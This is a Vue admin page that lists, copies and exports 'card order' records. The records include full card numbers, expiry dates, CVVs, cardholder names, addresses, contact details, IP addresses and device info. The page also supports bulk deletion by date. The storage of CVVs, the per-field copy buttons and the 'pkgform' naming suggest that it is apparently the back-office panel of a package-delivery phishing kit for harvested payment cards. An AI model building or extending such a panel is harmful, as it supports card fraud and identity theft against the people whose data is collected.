<template>
  <div class="app-container">
    <el-card class="box-card">
      <template #header>
        <div class="card-header">
          <span>卡单信息</span>
        </div>
      </template>

      <!-- 搜索表单 -->
      <el-form :model="queryParams" ref="queryFormRef" :inline="true" class="search-form">
        <el-form-item label="创建时间">
          <el-date-picker
            v-model="dateRange"
            type="daterange"
            range-separator="至"
            start-placeholder="开始日期"
            end-placeholder="结束日期"
            value-format="YYYY-MM-DD"
            :default-value="defaultDateRange"
            :disabled-date="disabledDate"
          />
        </el-form-item>
        <el-form-item class="search-buttons">
          <el-button type="primary" @click="handleQuery">查询</el-button>
          <el-button @click="resetQuery">重置</el-button>
          <el-button type="success" @click="handleExport">导出</el-button>
        </el-form-item>
      </el-form>

      <!-- 列表 -->
      <el-row :gutter="10" class="mb-8px">
        <el-col :span="1.5">
          <el-button
            type="danger"
            plain
            @click="handleBatchDelete"
            :disabled="selectedIds.length === 0"
            v-hasPermi="['system:pkgform:delete']"
          >
            <Icon icon="ep:delete" class="mr-5px" /> 批量删除 (选中)
          </el-button>
        </el-col>
        <el-col :span="1.5">
          <el-button
            type="warning"
            plain
            @click="openDateRangeDeleteDialog"
            v-hasPermi="['system:pkgform:delete']"
          >
            <Icon icon="ep:calendar" class="mr-5px" /> 按日期删除
          </el-button>
        </el-col>
      </el-row>

      <div v-loading="loading">
        <el-empty
          v-if="!loading && (!formList || formList.length === 0)"
          description="暂无卡单信息"
        />

        <!-- 表格展示 -->
        <el-table v-else :data="formList" border style="width: 100%" @selection-change="handleSelectionChange">
          <el-table-column type="selection" width="55" align="center" />
          <el-table-column prop="id" label="ID" width="60" />
          <el-table-column label="卡号" min-width="180">
            <template #default="scope">
              <div class="copy-wrapper">
                <span>{{ scope.row.cardNumber }}</span>
                <el-button type="primary" link @click="copyText(scope.row.cardNumber)">
                  <el-icon><DocumentCopy /></el-icon>
                </el-button>
              </div>
            </template>
          </el-table-column>
          <el-table-column label="有效期" min-width="100">
            <template #default="scope">
              <div class="copy-wrapper">
                <span>{{ formatExpireDate(scope.row.expireDate) }}</span>
                <el-button type="primary" link @click="copyText(formatExpireDate(scope.row.expireDate))">
                  <el-icon><DocumentCopy /></el-icon>
                </el-button>
              </div>
            </template>
          </el-table-column>
          <el-table-column label="CVV" min-width="80">
            <template #default="scope">
              <div class="copy-wrapper">
                <span>{{ scope.row.cvv }}</span>
                <el-button type="primary" link @click="copyText(scope.row.cvv)">
                  <el-icon><DocumentCopy /></el-icon>
                </el-button>
              </div>
            </template>
          </el-table-column>
          <el-table-column prop="cardholder" label="持卡人" min-width="120" />
          <el-table-column prop="name" label="收件人" min-width="100" />
          <el-table-column prop="address1" label="地址1" min-width="120" />
          <el-table-column prop="address2" label="地址2" min-width="120">
            <template #default="scope">
              {{ scope.row.address2 || '-' }}
            </template>
          </el-table-column>
          <el-table-column prop="city" label="城市" min-width="100" />
          <el-table-column prop="state" label="州/省" min-width="100" />
          <el-table-column prop="postalCode" label="邮编" min-width="100" />
          <el-table-column prop="email" label="邮箱" min-width="150" />
          <el-table-column prop="phone" label="电话" min-width="120" />
          <el-table-column prop="ipAddress" label="IP地址" min-width="120">
            <template #default="scope">
              {{ scope.row.ipAddress || '-' }}
            </template>
          </el-table-column>
          <el-table-column prop="deviceInfo" label="设备信息" min-width="120">
            <template #default="scope">
              <el-tooltip
                v-if="scope.row.deviceInfo && scope.row.deviceInfo.length > 10"
                :content="scope.row.deviceInfo"
                placement="top"
                effect="dark"
              >
                <span>{{ scope.row.deviceInfo.substring(0, 10) + '...' }}</span>
              </el-tooltip>
              <span v-else>{{ scope.row.deviceInfo || '-' }}</span>
            </template>
          </el-table-column>
          <el-table-column label="创建时间" min-width="160">
            <template #default="scope">
              {{ formatDate(scope.row.createdAt) }}
            </template>
          </el-table-column>
          <el-table-column label="更新时间" min-width="160">
            <template #default="scope">
              {{ formatDate(scope.row.updatedAt) }}
            </template>
          </el-table-column>
          <el-table-column label="操作" width="100" fixed="right">
            <template #default="scope">
              <el-button type="danger" link @click="handleDelete(Number(scope.row.id))">
                <el-icon><Delete /></el-icon>
                删除
              </el-button>
            </template>
          </el-table-column>
        </el-table>

        <!-- 分页 -->
        <div class="pagination-container">
          <el-pagination
            v-model:current-page="queryParams.pageNo"
            v-model:page-size="queryParams.pageSize"
            :page-sizes="[10, 20, 50, 100]"
            :total="total"
            layout="total, sizes, prev, pager, next, jumper"
            @size-change="handleSizeChange"
            @current-change="handleCurrentChange"
          />
        </div>
      </div>
    </el-card>

    <!-- 导出日期选择对话框 -->
    <el-dialog v-model="exportDialogVisible" title="导出卡单信息" width="500px" center>
      <el-form :model="exportForm" label-width="140px">
        <el-form-item label="导出日期范围" required>
          <el-date-picker
            v-model="exportForm.dateRange"
            type="daterange"
            range-separator="至"
            start-placeholder="开始日期"
            end-placeholder="结束日期"
            value-format="YYYY-MM-DD"
            :default-value="defaultDateRange"
            :disabled-date="disabledDate"
          />
        </el-form-item>
        <el-form-item class="dialog-footer">
          <el-button @click="exportDialogVisible = false">取消</el-button>
          <el-button type="primary" @click="exportData" :loading="exportLoading">导出</el-button>
        </el-form-item>
      </el-form>
    </el-dialog>

    <!-- Add Date Range Delete Dialog -->
    <el-dialog
      title="按日期范围删除"
      v-model="dateRangeDeleteDialogVisible"
      width="500px"
      append-to-body
      center
    >
      <el-form ref="dateRangeDeleteFormRef" :model="dateRangeDeleteForm" label-width="100px">
        <el-form-item label="删除日期范围" prop="dateRange">
          <el-date-picker
            v-model="dateRangeDeleteForm.dateRange"
            type="daterange"
            range-separator="至"
            start-placeholder="开始日期"
            end-placeholder="结束日期"
            value-format="YYYY-MM-DD"
            :disabled-date="(time) => time.getTime() > Date.now()"
          />
        </el-form-item>
      </el-form>
      <template #footer>
        <el-button @click="dateRangeDeleteDialogVisible = false">取消</el-button>
        <el-button type="primary" @click="confirmDateRangeDelete">确认删除</el-button>
      </template>
    </el-dialog>

  </div>
</template>

<script setup lang="ts">
import { ref, onMounted, computed, reactive } from 'vue'
import { getPkgFormList, deletePkgForm, deletePkgFormsBatch } from '@/api/system/pkgform'
import type { PkgFormVO, PkgFormQuery } from '@/api/system/pkgform/types'
import { ElMessage, ElMessageBox } from 'element-plus'
import { DocumentCopy, Delete } from '@element-plus/icons-vue'
import dayjs from 'dayjs'
// 使用 ESM 导入 XLSX 模块
import * as XLSX from 'xlsx'

defineOptions({
  name: 'PkgFormView'
})

const loading = ref(false)
const formList = ref<PkgFormVO[]>([])
const total = ref(0)
const dateRange = ref<string[]>([])
const exportDialogVisible = ref(false)
const exportLoading = ref(false)
const exportForm = ref({
  dateRange: [] as string[]
})
const dateRangeDeleteDialogVisible = ref(false)
const dateRangeDeleteFormRef = ref()
const dateRangeDeleteForm = reactive({
  dateRange: [] as [string, string] | []
})

// 新增：批量删除相关
const selectedIds = ref<number[]>([]) // 存储选中的行 ID

// 默认日期范围设置为前三天到当天
const defaultDateRange = computed(() => {
  const end = new Date()
  const start = new Date()
  start.setDate(start.getDate() - 3)
  return [start, end] as [Date, Date]
})

// 限制日期选择器选择范围，最大间隔30天
const disabledDate = (time: Date) => {
  if (!dateRange.value || dateRange.value.length === 0) {
    return false
  }
  
  // 如果已经选择了开始日期，则限制结束日期不超过开始日期+30天
  if (dateRange.value[0] && !dateRange.value[1]) {
    const startDate = new Date(dateRange.value[0])
    const thirtyDaysAfter = new Date(startDate)
    thirtyDaysAfter.setDate(startDate.getDate() + 30)
    return time.getTime() > thirtyDaysAfter.getTime()
  }
  
  // 如果已经选择了结束日期，则限制开始日期不早于结束日期-30天
  if (!dateRange.value[0] && dateRange.value[1]) {
    const endDate = new Date(dateRange.value[1])
    const thirtyDaysBefore = new Date(endDate)
    thirtyDaysBefore.setDate(endDate.getDate() - 30)
    return time.getTime() < thirtyDaysBefore.getTime()
  }
  
  return false
}

// 查询参数
const queryParams = ref<PkgFormQuery>({
  pageNo: 1,
  pageSize: 10,
  createTimeStart: '',
  createTimeEnd: ''
})

// 查询表单
const queryFormRef = ref()

// 格式化日期
const formatDate = (date: string) => {
  if (!date) return '-'
  return dayjs(date).format('YYYY-MM-DD HH:mm:ss')
}

// 格式化有效期
const formatExpireDate = (date: string) => {
  if (!date) return '-'
  const parts = date.split('/')
  if (parts.length !== 2) return '-'
  const [month, year] = parts
  if (!month || !year) return '-'
  return `${month}/${year.slice(-2)}`
}

// 复制文本
const copyText = (text: string) => {
  if (!text) return
  navigator.clipboard.writeText(text).then(() => {
    ElMessage.success('复制成功')
  }).catch(() => {
    ElMessage.error('复制失败')
  })
}

// 获取数据
const getData = async () => {
  loading.value = true
  try {
    const params = { ...queryParams.value }
    if (dateRange.value?.length === 2) {
      params.createTimeStart = dateRange.value[0]
      params.createTimeEnd = dateRange.value[1]
    } else {
      // 如果没有选择日期范围，默认使用前三天到当天
      const defaultRange = defaultDateRange.value
      params.createTimeStart = defaultRange[0].toISOString().split('T')[0]
      params.createTimeEnd = defaultRange[1].toISOString().split('T')[0]
      // 更新UI上的日期范围
      dateRange.value = [params.createTimeStart, params.createTimeEnd]
    }
    
    const res = await getPkgFormList(params)
    // 确保返回的数据是数组
    formList.value = Array.isArray(res.list) ? res.list : []
    total.value = typeof res.total === 'number' ? res.total : 0
  } catch (error) {
    console.error('获取卡单信息失败:', error)
    ElMessage.error('获取卡单信息失败')
    formList.value = []
    total.value = 0
  } finally {
    loading.value = false
  }
}

// 查询按钮点击
const handleQuery = () => {
  queryParams.value.pageNo = 1
  getData()
}

// 重置按钮点击
const resetQuery = () => {
  dateRange.value = []
  queryParams.value = {
    pageNo: 1,
    pageSize: 10,
    createTimeStart: '',
    createTimeEnd: ''
  }
  getData()
}

// 分页大小改变
const handleSizeChange = (val: number) => {
  queryParams.value.pageSize = val
  getData()
}

// 页码改变
const handleCurrentChange = (val: number) => {
  queryParams.value.pageNo = val
  getData()
}

// 显示导出对话框
const handleExport = () => {
  exportDialogVisible.value = true
}

// 导出数据
const exportData = async () => {
  if (!exportForm.value.dateRange?.length) {
    ElMessage.warning('请选择导出日期范围')
    return
  }

  exportLoading.value = true
  try {
    const params = {
      createTimeStart: exportForm.value.dateRange[0],
      createTimeEnd: exportForm.value.dateRange[1]
    }
    
    const res = await getPkgFormList(params)
    if (!Array.isArray(res.list) || res.list.length === 0) {
      ElMessage.warning('所选日期范围内没有数据可导出')
      return
    }

    const data = res.list.map(item => ({
      '卡号': item.cardNumber || '-',
      '有效期': formatExpireDate(item.expireDate),
      'CVV': item.cvv || '-',
      '持卡人': item.cardholder || '-',
      '收件人': item.name || '-',
      '地址1': item.address1 || '-',
      '地址2': item.address2 || '-',
      '城市': item.city || '-',
      '州/省': item.state || '-',
      '邮编': item.postalCode || '-',
      '邮箱': item.email || '-',
      '电话': item.phone || '-',
      'IP地址': item.ipAddress || '-',
      '设备信息': item.deviceInfo || '-',
      '创建时间': formatDate(item.createdAt),
      '更新时间': formatDate(item.updatedAt)
    }))

    const worksheet = XLSX.utils.json_to_sheet(data)
    const workbook = XLSX.utils.book_new()
    XLSX.utils.book_append_sheet(workbook, worksheet, '卡单信息')
    
    const fileName = `卡单信息_${exportForm.value.dateRange[0]}_${exportForm.value.dateRange[1]}.xlsx`
    XLSX.writeFile(workbook, fileName)
    
    ElMessage.success('导出成功')
    exportDialogVisible.value = false
  } catch (error) {
    console.error('导出失败:', error)
    ElMessage.error('导出失败')
  } finally {
    exportLoading.value = false
  }
}

// 删除卡单信息
const handleDelete = async (id: number) => {
  loading.value = true
  try {
    await ElMessageBox.confirm('确认要删除这条卡单信息吗？', '警告', {
      type: 'warning'
    })
    await deletePkgForm(id)
    ElMessage.success('删除成功')
    await getData()
  } catch (error) {
    if (error !== 'cancel') {
      console.error('删除卡单信息失败:', error)
      ElMessage.error('删除失败')
    }
  } finally {
    loading.value = false
  }
}

/** 处理表格选中变化 */
const handleSelectionChange = (selection: PkgFormVO[]) => {
  selectedIds.value = selection.map((item) => Number(item.id))
}

/** 按日期范围删除 - 打开弹窗 */
const openDateRangeDeleteDialog = () => {
  dateRangeDeleteForm.dateRange = [] // 清空上次选择
  // Reset validation if using form rules
  // dateRangeDeleteFormRef.value?.resetFields()
  dateRangeDeleteDialogVisible.value = true
}

/** 处理批量删除（按选中 ID） */
const handleBatchDelete = async () => {
  if (selectedIds.value.length === 0) {
    ElMessage.warning('请先选择要删除的数据！')
    return
  }
  loading.value = true
  try {
    await ElMessageBox.confirm(
      `是否确认删除选中的 ${selectedIds.value.length} 条数据项?`,
      '警告',
      { type: 'warning' }
    )
    const res = await deletePkgFormsBatch({ ids: selectedIds.value })
    ElMessage.success(`删除成功，共影响 ${res.affectedCount || 0} 条记录`)
    await getData()
    selectedIds.value = [] // 清空内部状态
  } catch (error: any) {
    if (error !== 'cancel') {
      ElMessage.error('批量删除失败：' + (error.msg || '未知错误'))
    }
  } finally {
    loading.value = false
  }
}

/** 确认按日期范围删除 */
const confirmDateRangeDelete = async () => {
  if (!dateRangeDeleteForm.dateRange || dateRangeDeleteForm.dateRange.length !== 2) {
    ElMessage.warning('请选择有效的日期范围！')
    return
  }
  loading.value = true
  const [startDate, endDate] = dateRangeDeleteForm.dateRange
  try {
    await ElMessageBox.confirm(
      `是否确认删除从 ${startDate} 到 ${endDate} 的所有数据项? 此操作不可恢复！`,
      '警告',
      { type: 'warning' }
    )
    const res = await deletePkgFormsBatch({ startDate, endDate })
    ElMessage.success(`删除成功，共影响 ${res.affectedCount || 0} 条记录`)
    dateRangeDeleteDialogVisible.value = false // 关闭弹窗
    await getData() // 刷新列表
  } catch (error: any) {
    if (error !== 'cancel') {
      ElMessage.error('按日期删除失败：' + (error.msg || '未知错误'))
    }
  } finally {
    loading.value = false
  }
}

onMounted(() => {
  const defaultRange = defaultDateRange.value
  dateRange.value = [
    defaultRange[0].toISOString().split('T')[0],
    defaultRange[1].toISOString().split('T')[0]
  ]
  getData()
})
</script>

<style scoped>
.app-container {
  padding: 20px;
}

.card-header {
  display: flex;
  justify-content: space-between;
  align-items: center;
}

.search-form {
  display: flex;
  margin-bottom: 20px;
  justify-content: space-between;
  align-items: center;
}

.search-buttons {
  margin-left: auto;
}

.pagination-container {
  display: flex;
  justify-content: center;
  margin-top: 20px;
}

.copy-wrapper {
  display: flex;
  align-items: center;
  justify-content: space-between;
}

.dialog-footer {
  display: flex;
  justify-content: center;
  margin-top: 20px;
}
</style> 